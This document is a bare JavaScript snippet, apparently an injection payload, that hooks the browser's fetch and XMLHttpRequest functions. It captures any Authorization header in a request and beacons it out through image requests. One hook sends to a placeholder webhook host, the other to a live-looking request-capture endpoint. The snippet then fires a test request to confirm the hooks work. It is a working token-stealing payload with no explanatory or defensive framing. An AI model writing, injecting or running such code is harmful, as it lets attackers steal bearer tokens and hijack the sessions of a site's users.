(function() {
    // 1. Hook Fetch
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        let h;
        if (args[1] && args[1].headers) h = args[1].headers;
        else if (args[0] && args[0].headers) h = args[0].headers;

        if (h) {
            const t = (h instanceof Headers) ? h.get('Authorization') : (h['Authorization'] || h['authorization']);
            if (t) {
                new Image().src = `https://your-webhook.com/log?t=${encodeURIComponent(t)}&type=fetch`;
            }
        }
        return originalFetch.apply(this, args);
    };

    // 2. Hook XMLHttpRequest (XHR)
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;

    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
        if (header.toLowerCase() === 'authorization') {
            new Image().src = `https://28ac04qq.instances.httpworkbench.com/log?t=${encodeURIComponent(value)}&type=xhr`;
        }
        return originalSetRequestHeader.apply(this, arguments);
    };

    // 3. Test the hook immediately
    fetch('/', { headers: { 'Authorization': 'HOOK_ACTIVE_TEST' } });
})();
